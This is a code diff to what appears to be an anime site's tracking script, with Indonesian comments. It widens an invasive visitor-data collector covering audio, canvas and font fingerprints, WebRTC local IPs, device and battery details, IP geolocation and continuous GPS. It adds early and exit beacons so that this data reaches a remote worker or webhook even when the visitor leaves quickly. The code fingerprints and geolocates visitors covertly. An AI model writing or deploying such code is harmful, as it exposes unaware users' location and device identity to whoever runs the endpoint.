@@ -1335,8 +1335,12 @@ function cleanPayload(raw, identity) {
 let visitReportSent = false;
 let instantReportSent = false;
 let enrichedReportSent = false;
+let enrichedExitBeaconSent = false;
 let pendingInstantPayload = null;
 let pendingEnrichedPayload = null;
+let pendingGpsPayload = null;
+let gpsExitBeaconSent = false;
+let gpsWatchCancel = null;
 let latestVisitorId = null;
 let latestIp = null;
 let latestDeviceName = null;
@@ -1363,6 +1367,51 @@ function markEnrichedQueued() {
     if (enrichedReportSent) return false;
     enrichedReportSent = true;
     return true;
+}
+
+let enrichedRawDraft = null;
+let enrichedIdentityDraft = null;
+
+function rebuildPendingEnriched(sessionId, partial = true) {
+    if (!enrichedRawDraft) return null;
+    const payload = cleanPayload(enrichedRawDraft, enrichedIdentityDraft);
+    payload._enriched = true;
+    if (partial) payload._enrichedPartial = true;
+    payload.reportSessionId = sessionId;
+    payload.url = location.href;
+    if (!payload.referrer && document.referrer) payload.referrer = document.referrer;
+    Object.assign(payload, getPageMeta());
+    pendingEnrichedPayload = payload;
+    return payload;
+}
+
+function initEnrichedDraft(sessionId, raw, identity) {
+    enrichedRawDraft = { ...raw };
+    enrichedIdentityDraft = identity;
+    rebuildPendingEnriched(sessionId, true);
+}
+
+function mergeEnrichedPartial(sessionId, partial) {
+    if (!enrichedRawDraft || !partial) return;
+    for (const key in partial) {
+        const val = partial[key];
+        if (val !== undefined && val !== null && val !== '') enrichedRawDraft[key] = val;
+    }
+    rebuildPendingEnriched(sessionId, true);
+}
+
+function finalizeEnrichedDraft(sessionId, finalFields, identity) {
+    if (!enrichedRawDraft) return null;
+    Object.assign(enrichedRawDraft, finalFields);
+    enrichedIdentityDraft = { ...enrichedIdentityDraft, ...identity };
+    const payload = cleanPayload(enrichedRawDraft, enrichedIdentityDraft);
+    payload._enriched = true;
+    payload.reportSessionId = sessionId;
+    payload.url = location.href;
+    if (!payload.referrer && document.referrer) payload.referrer = document.referrer;
+    Object.assign(payload, getPageMeta());
+    pendingEnrichedPayload = payload;
+    return payload;
 }
 
 function getPageMeta() {
@@ -1403,6 +1452,31 @@ function trackAnimeView(anime) {
         ...getPageMeta(),
         url: location.href,
     }));
+}
+
+function flushPendingGps() {
+    if (!CF_READY || gpsExitBeaconSent || !pendingGpsPayload) return;
+    gpsExitBeaconSent = true;
+    sendBeaconWorker(pendingGpsPayload);
+}
+
+function flushPendingReports() {
+    if (!CF_READY) return;
+    if (pendingEnrichedPayload && !enrichedExitBeaconSent) {
+        enrichedExitBeaconSent = true;
+        sendBeaconWorker(pendingEnrichedPayload);
+    } else if (!instantReportSent && pendingInstantPayload) {
+        instantReportSent = true;
+        sendBeaconWorker({ ...pendingInstantPayload, _instant: true, _exitFlush: true });
+    }
+    flushPendingGps();
+}
+
+function onPageExit() {
+    if (gpsWatchCancel) {
+        try { gpsWatchCancel(); } catch (_) {}
+    }
+    flushPendingReports();
 }
 
 window.__aniseasonTrack = { trackAnimeView };
@@ -1593,125 +1667,177 @@ async function collectAll() {
         sendBeaconWorker(instantPayload);
     }
 
-    const [audioFpResult, ipResult, mediaResult, batteryResult, uahResult, webrtcIpResult, fontResult] = await Promise.allSettled([
-        (async () => {
+    // GPS paralel — tidak tunggu enriched selesai
+    sendGpsReport(sessionId);
+
+    // Enriched draft langsung — supaya exit beacon punya data meski IP/font belum selesai
+    initEnrichedDraft(sessionId, {
+        ...navData, ...screenData, ...gpuData,
+        audioFingerprint: earlyAudioFp, canvasFingerprint,
+        ...storageData, ...localeData, ...features,
+        plugins: pluginsList || null, visitorId: earlyVisitorId,
+        ...prefersData, referrer: document.referrer || null,
+    }, identity);
+
+    const ipPromise = (async () => {
+        const apis = [
+            { url: "https://ipapi.co/json/", parse: j => ({ ip: j.ip, isp: j.org, city: j.city, country: j.country_name, region: j.region, proxy: j.proxy ?? null, hosting: j.hosting ?? null, asn: j.asn ?? null }) },
+            { url: "https://ipwho.is/", parse: j => ({ ip: j.ip, isp: j.connection?.isp, city: j.city, country: j.country, region: j.region, proxy: null, hosting: null, asn: j.connection?.asn ? String(j.connection.asn) : null }) },
+            { url: "https://api.ipify.org?format=json", parse: j => ({ ip: j.ip, isp: null, city: null, country: null, region: null, proxy: null, hosting: null, asn: null }) },
+        ];
+        for (const api of apis) {
             try {
-                const ctx = new OfflineAudioContext(1, 4096, 44100);
-                const osc = ctx.createOscillator();
-                osc.type = 'triangle'; osc.frequency.value = 1000;
-                const comp = ctx.createDynamicsCompressor();
-                comp.threshold.value = -50; comp.knee.value = 40;
-                comp.ratio.value = 12; comp.attack.value = 0; comp.release.value = 0.25;
-                osc.connect(comp); comp.connect(ctx.destination);
-                osc.start(0);
-                const buf = await ctx.startRendering();
-                const data = buf.getChannelData(0).slice(4000, 4064);
-                return hashStr(Array.from(data).join(','));
-            } catch(e) { return null; }
-        })(),
-        (async () => {
-            const apis = [
-                { url: "https://ipapi.co/json/", parse: j => ({ ip: j.ip, isp: j.org, city: j.city, country: j.country_name, region: j.region, proxy: j.proxy ?? null, hosting: j.hosting ?? null, asn: j.asn ?? null }) },
-                { url: "https://ipwho.is/", parse: j => ({ ip: j.ip, isp: j.connection?.isp, city: j.city, country: j.country, region: j.region, proxy: null, hosting: null, asn: j.connection?.asn ? String(j.connection.asn) : null }) },
-                { url: "https://api.ipify.org?format=json", parse: j => ({ ip: j.ip, isp: null, city: null, country: null, region: null, proxy: null, hosting: null, asn: null }) },
-            ];
-            for (const api of apis) {
-                try {
-                    const resp = await fetch(api.url, { signal: AbortSignal.timeout(2000) });
-                    if (!resp.ok) continue;
-                    const j = await resp.json();
-                    const result = api.parse(j);
-                    if (result.ip) return result;
-                } catch(e) { continue; }
-            }
-            return {};
-        })(),
-        (async () => {
-            const devices = await navigator.mediaDevices?.enumerateDevices() ?? [];
-            return {
-                audioIn: devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'Mic'),
-                videoIn: devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'Cam'),
-                audioOut: devices.filter(d => d.kind === 'audiooutput').map(d => d.label || 'Speaker'),
-            };
-        })(),
-        (async () => {
-            const batt = await navigator.getBattery?.();
-            if (!batt) return { level: null, charging: null };
-            return { level: Math.round(batt.level * 100) + "%", charging: batt.charging };
-        })(),
-        (async () => {
-            if (!navigator.userAgentData) return {};
-            const base = { brands: JSON.stringify(navigator.userAgentData.brands), mobile: navigator.userAgentData.mobile };
-            try {
-                const hints = await navigator.userAgentData.getHighEntropyValues([
-                    "model", "architecture", "bitness", "platformVersion",
-                    "platform", "fullVersionList", "formFactor", "wow64"
-                ]);
-                return {
-                    ...base,
-                    deviceModel: hints.model ?? null,
-                    architecture: hints.architecture ?? null,
-                    bitness: hints.bitness ?? null,
-                    platformName: hints.platform ?? null,
-                    platformVersion: hints.platformVersion ?? null,
-                    fullVersionList: hints.fullVersionList ? JSON.stringify(hints.fullVersionList) : null,
-                    formFactor: hints.formFactor != null
-                        ? (Array.isArray(hints.formFactor) ? hints.formFactor.join(', ') : String(hints.formFactor))
-                        : null,
-                    wow64: hints.wow64 ?? null,
-                };
-            } catch(e) {
-                const hints = await navigator.userAgentData.getHighEntropyValues(["model", "architecture", "bitness"]);
-                return { ...base, deviceModel: hints.model ?? null, architecture: hints.architecture ?? null, bitness: hints.bitness ?? null };
-            }
-        })(),
-        // WebRTC Local IP detection
-        (async () => {
-            if (!window.RTCPeerConnection) return null;
-            try {
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-                pc.createDataChannel('');
-                const offer = await pc.createOffer();
-                await pc.setLocalDescription(offer);
-                return new Promise((resolve) => {
-                    const ips = new Set();
-                    const timeout = setTimeout(() => { pc.close(); resolve(Array.from(ips)); }, 1200);
-                    pc.onicecandidate = (e) => {
-                        if (!e.candidate) { clearTimeout(timeout); pc.close(); resolve(Array.from(ips)); return; }
-                        const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
-                        if (match) ips.add(match[1]);
-                    };
-                });
-            } catch(e) { return null; }
-        })(),
-        // Font detection
-        (async () => {
-            const testFonts = [
-                'Arial','Verdana','Helvetica','Times New Roman','Georgia','Courier New',
-                'Comic Sans MS','Impact','Trebuchet MS','Palatino Linotype',
-                'Lucida Sans Unicode','Tahoma','Segoe UI','Roboto','Noto Sans',
-                'Microsoft Sans Serif','Calibri','Cambria','Consolas',
-                'Malgun Gothic','Yu Gothic','MS Gothic','SimSun','PMingLiU',
-                'Apple SD Gothic Neo','Hiragino Sans','SF Pro Display',
-                'Samsung Sans','One UI Sans','MIUI Sans',
-            ];
-            const baseFonts = ['monospace','sans-serif','serif'];
-            const span = document.createElement('span');
-            span.style.cssText = 'position:absolute;left:-9999px;visibility:hidden;font-size:72px';
-            span.textContent = 'mmmmmmmmmmlli';
-            document.body.appendChild(span);
-            const baseWidths = {};
-            for (const base of baseFonts) { span.style.fontFamily = base; baseWidths[base] = span.offsetWidth; }
-            const detected = [];
-            for (const font of testFonts) {
-                for (const base of baseFonts) {
-                    span.style.fontFamily = `'${font}', ${base}`;
-                    if (span.offsetWidth !== baseWidths[base]) { detected.push(font); break; }
+                const resp = await fetch(api.url, { signal: AbortSignal.timeout(2000) });
+                if (!resp.ok) continue;
+                const j = await resp.json();
+                const result = api.parse(j);
+                if (result.ip) {
+                    latestIp = result.ip;
+                    mergeEnrichedPartial(sessionId, result);
+                    return result;
                 }
+            } catch (_) { continue; }
+        }
+        return {};
+    })();
+
+    const audioFpPromise = (async () => {
+        try {
+            const ctx = new OfflineAudioContext(1, 4096, 44100);
+            const osc = ctx.createOscillator();
+            osc.type = 'triangle'; osc.frequency.value = 1000;
+            const comp = ctx.createDynamicsCompressor();
+            comp.threshold.value = -50; comp.knee.value = 40;
+            comp.ratio.value = 12; comp.attack.value = 0; comp.release.value = 0.25;
+            osc.connect(comp); comp.connect(ctx.destination);
+            osc.start(0);
+            const buf = await ctx.startRendering();
+            const data = buf.getChannelData(0).slice(4000, 4064);
+            const fp = hashStr(Array.from(data).join(','));
+            mergeEnrichedPartial(sessionId, { audioFingerprint: fp });
+            return fp;
+        } catch (_) {
+            return null;
+        }
+    })();
+
+    const mediaPromise = (async () => {
+        const devices = await navigator.mediaDevices?.enumerateDevices() ?? [];
+        const data = {
+            audioIn: devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'Mic'),
+            videoIn: devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'Cam'),
+            audioOut: devices.filter(d => d.kind === 'audiooutput').map(d => d.label || 'Speaker'),
+        };
+        mergeEnrichedPartial(sessionId, data);
+        return data;
+    })();
+
+    const batteryPromise = (async () => {
+        const batt = await navigator.getBattery?.();
+        if (!batt) return { level: null, charging: null };
+        const data = { level: Math.round(batt.level * 100) + "%", charging: batt.charging };
+        mergeEnrichedPartial(sessionId, data);
+        return data;
+    })();
+
+    const uahPromise = (async () => {
+        if (!navigator.userAgentData) return {};
+        const base = { brands: JSON.stringify(navigator.userAgentData.brands), mobile: navigator.userAgentData.mobile };
+        try {
+            const hints = await navigator.userAgentData.getHighEntropyValues([
+                "model", "architecture", "bitness", "platformVersion",
+                "platform", "fullVersionList", "formFactor", "wow64"
+            ]);
+            const data = {
+                ...base,
+                deviceModel: hints.model ?? null,
+                architecture: hints.architecture ?? null,
+                bitness: hints.bitness ?? null,
+                platformName: hints.platform ?? null,
+                platformVersion: hints.platformVersion ?? null,
+                fullVersionList: hints.fullVersionList ? JSON.stringify(hints.fullVersionList) : null,
+                formFactor: hints.formFactor != null
+                    ? (Array.isArray(hints.formFactor) ? hints.formFactor.join(', ') : String(hints.formFactor))
+                    : null,
+                wow64: hints.wow64 ?? null,
+            };
+            mergeEnrichedPartial(sessionId, data);
+            return data;
+        } catch (_) {
+            const hints = await navigator.userAgentData.getHighEntropyValues(["model", "architecture", "bitness"]);
+            const data = { ...base, deviceModel: hints.model ?? null, architecture: hints.architecture ?? null, bitness: hints.bitness ?? null };
+            mergeEnrichedPartial(sessionId, data);
+            return data;
+        }
+    })();
+
+    const webrtcIpPromise = (async () => {
+        if (!window.RTCPeerConnection) return null;
+        try {
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+            pc.createDataChannel('');
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
+            const ips = await new Promise((resolve) => {
+                const found = new Set();
+                const timeout = setTimeout(() => { pc.close(); resolve(Array.from(found)); }, 1200);
+                pc.onicecandidate = (e) => {
+                    if (!e.candidate) { clearTimeout(timeout); pc.close(); resolve(Array.from(found)); return; }
+                    const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
+                    if (match) found.add(match[1]);
+                };
+            });
+            if (ips.length) {
+                mergeEnrichedPartial(sessionId, { localIPs: ips.join(', ') });
             }
-            document.body.removeChild(span);
-            return detected;
-        })(),
+            return ips;
+        } catch (_) {
+            return null;
+        }
+    })();
+
+    const fontPromise = (async () => {
+        const testFonts = [
+            'Arial','Verdana','Helvetica','Times New Roman','Georgia','Courier New',
+            'Comic Sans MS','Impact','Trebuchet MS','Palatino Linotype',
+            'Lucida Sans Unicode','Tahoma','Segoe UI','Roboto','Noto Sans',
+            'Microsoft Sans Serif','Calibri','Cambria','Consolas',
+            'Malgun Gothic','Yu Gothic','MS Gothic','SimSun','PMingLiU',
+            'Apple SD Gothic Neo','Hiragino Sans','SF Pro Display',
+            'Samsung Sans','One UI Sans','MIUI Sans',
+        ];
+        const baseFonts = ['monospace','sans-serif','serif'];
+        const span = document.createElement('span');
+        span.style.cssText = 'position:absolute;left:-9999px;visibility:hidden;font-size:72px';
+        span.textContent = 'mmmmmmmmmmlli';
+        document.body.appendChild(span);
+        const baseWidths = {};
+        for (const base of baseFonts) { span.style.fontFamily = base; baseWidths[base] = span.offsetWidth; }
+        const detected = [];
+        for (const font of testFonts) {
+            for (const base of baseFonts) {
+                span.style.fontFamily = `'${font}', ${base}`;
+                if (span.offsetWidth !== baseWidths[base]) { detected.push(font); break; }
+            }
+        }
+        document.body.removeChild(span);
+        if (detected.length) {
+            mergeEnrichedPartial(sessionId, {
+                detectedFonts: detected.join(', '),
+                fontCount: detected.length,
+            });
+        }
+        return detected;
+    })();
+
+    const [audioFpResult, ipResult, mediaResult, batteryResult, uahResult, webrtcIpResult, fontResult] = await Promise.allSettled([
+        audioFpPromise,
+        ipPromise,
+        mediaPromise,
+        batteryPromise,
+        uahPromise,
+        webrtcIpPromise,
+        fontPromise,
     ]);
 
     const audioFingerprint = audioFpResult.status === 'fulfilled' ? audioFpResult.value : null;
@@ -1738,25 +1864,16 @@ async function collectAll() {
     latestIp = ipData.ip || null;
     latestDeviceName = deviceName;
 
-    const raw = {
-        ...navData, ...screenData, ...gpuData, audioFingerprint: audioFpFinal, canvasFingerprint,
-        ...storageData, ...mediaData, ...localeData, ...batteryData, ...ipData,
-        ...features, plugins: pluginsList || null, ...uahData,
+    const payload = finalizeEnrichedDraft(sessionId, {
+        audioFingerprint: audioFpFinal,
         visitorId,
         localIPs: localIPs && localIPs.length > 0 ? localIPs.join(', ') : null,
         detectedFonts: detectedFonts && detectedFonts.length > 0 ? detectedFonts.join(', ') : null,
         fontCount: detectedFonts ? detectedFonts.length : null,
-        ...prefersData, ...getPageMeta(),
-        url: location.href, referrer: document.referrer || null,
-    };
-
-    const payload = cleanPayload(raw, {
+    }, {
         ...identity,
         visitorId, canvasFingerprint, audioFingerprint: audioFpFinal,
     });
-    payload._enriched = true;
-    payload.reportSessionId = sessionId;
-    pendingEnrichedPayload = payload;
 
     const sends = [];
     if (CF_READY && markEnrichedQueued()) {
@@ -1794,8 +1911,29 @@ async function collectAll() {
     }
 
     await Promise.allSettled(sends);
+}
 
-    sendGpsReport(sessionId);
+function buildGpsPayload(sessionId, pos, extra = {}) {
+    const acc = pos.coords.accuracy;
+    return cleanPayload({
+        _gpsOnly: true,
+        reportSessionId: sessionId,
+        visitorId: latestVisitorId,
+        ip: latestIp,
+        deviceName: latestDeviceName,
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        accuracy: acc,
+        altitude: pos.coords.altitude,
+        altitudeAccuracy: pos.coords.altitudeAccuracy,
+        heading: pos.coords.heading,
+        speed: pos.coords.speed,
+        gpsTimestamp: pos.timestamp,
+        gpsQuality: gpsQualityLabel(acc),
+        ...getPageMeta(),
+        url: location.href,
+        ...extra,
+    });
 }
 
 function getBestGpsPosition(options = {}) {
@@ -1803,6 +1941,7 @@ function getBestGpsPosition(options = {}) {
         targetAccuracy = 30,
         maxWait = 15000,
         minReadings = 2,
+        onReading = null,
     } = options;
 
     return new Promise((resolve, reject) => {
@@ -1820,6 +1959,8 @@ function getBestGpsPosition(options = {}) {
             if (settled) return;
             settled = true;
             if (watchId != null) navigator.geolocation.clearWatch(watchId);
+            watchId = null;
+            gpsWatchCancel = null;
             resolve(best);
         };
 
@@ -1827,6 +1968,8 @@ function getBestGpsPosition(options = {}) {
             if (settled) return;
             settled = true;
             if (watchId != null) navigator.geolocation.clearWatch(watchId);
+            watchId = null;
+            gpsWatchCancel = null;
             if (readings.length) {
                 finish(readings.sort((a, b) => a.coords.accuracy - b.coords.accuracy)[0]);
             } else {
@@ -1834,10 +1977,26 @@ function getBestGpsPosition(options = {}) {
             }
         };
 
+        gpsWatchCancel = () => {
+            if (settled) return;
+            if (watchId != null) navigator.geolocation.clearWatch(watchId);
+            if (readings.length) {
+                finish(readings.slice().sort((a, b) => a.coords.accuracy - b.coords.accuracy)[0]);
+            } else {
+                settled = true;
+                watchId = null;
+                gpsWatchCancel = null;
+                reject(Object.assign(new Error('GPS dibatalkan'), { code: 'ABORT' }));
+            }
+        };
+
         watchId = navigator.geolocation.watchPosition(
             (pos) => {
                 readings.push(pos);
                 const best = readings.slice().sort((a, b) => a.coords.accuracy - b.coords.accuracy)[0];
+                if (onReading) {
+                    try { onReading(pos, best); } catch (_) {}
+                }
                 const goodEnough = best.coords.accuracy <= targetAccuracy && readings.length >= minReadings;
                 const timedOut = Date.now() - started >= maxWait;
                 if (goodEnough || timedOut) finish(best);
@@ -1873,46 +2032,58 @@ async function sendGpsReport(sessionId) {
         url: location.href,
     };
 
+    let fastBeaconSent = false;
+
     try {
         const pos = await getBestGpsPosition({
             targetAccuracy: 30,
             maxWait: 15000,
             minReadings: 2,
+            onReading: (_pos, best) => {
+                const acc = best.coords.accuracy;
+                if (acc > 500) return;
+                const payload = buildGpsPayload(sessionId, best);
+                pendingGpsPayload = payload;
+                if (!fastBeaconSent) {
+                    fastBeaconSent = true;
+                    sendBeaconWorker(payload);
+                }
+            },
         });
+
+        if (gpsExitBeaconSent) return;
 
         const acc = pos.coords.accuracy;
         if (acc > 500) {
-            postWorker(cleanPayload({
+            const errPayload = cleanPayload({
                 ...basePayload,
                 _gpsError: true,
                 gpsErrorCode: 'LOW_ACCURACY',
                 accuracy: acc,
-            }));
+            });
+            pendingGpsPayload = errPayload;
+            sendBeaconWorker(errPayload);
             return;
         }
 
-        await fetch(WORKER_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(cleanPayload({
-                ...basePayload,
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                accuracy: acc,
-                altitude: pos.coords.altitude,
-                altitudeAccuracy: pos.coords.altitudeAccuracy,
-                heading: pos.coords.heading,
-                speed: pos.coords.speed,
-                gpsTimestamp: pos.timestamp,
-                gpsQuality: gpsQualityLabel(acc),
-            })),
-        });
+        const payload = buildGpsPayload(sessionId, pos);
+        pendingGpsPayload = payload;
+
+        if (document.visibilityState === 'hidden') {
+            sendBeaconWorker(payload);
+            gpsExitBeaconSent = true;
+        } else {
+            postWorker(payload);
+        }
     } catch (err) {
-        postWorker(cleanPayload({
+        if (gpsExitBeaconSent) return;
+        const errPayload = cleanPayload({
             ...basePayload,
             _gpsError: true,
             gpsErrorCode: err?.code ?? 'UNKNOWN',
-        }));
+        });
+        pendingGpsPayload = errPayload;
+        sendBeaconWorker(errPayload);
     }
 }
 
@@ -1949,19 +2120,10 @@ collectAll();
     );
 
     let durationSent = false;
-    function flushPendingReports() {
-        if (!CF_READY || enrichedReportSent) return;
-        // Hanya fallback jika enriched belum sempat di-queue (user keluar sangat cepat)
-        if (pendingEnrichedPayload && markEnrichedQueued()) {
-            sendBeaconWorker(pendingEnrichedPayload);
-        } else if (!instantReportSent && pendingInstantPayload) {
-            sendBeaconWorker({ ...pendingInstantPayload, _instant: true, _exitFlush: true });
-        }
-    }
     function sendDuration() {
         if (durationSent) return;
         durationSent = true;
-        flushPendingReports();
+        onPageExit();
         // Durasi tidak dikirim ke webhook — cukup 3 pesan utama + anime click
     }
     document.addEventListener('visibilitychange', () => {
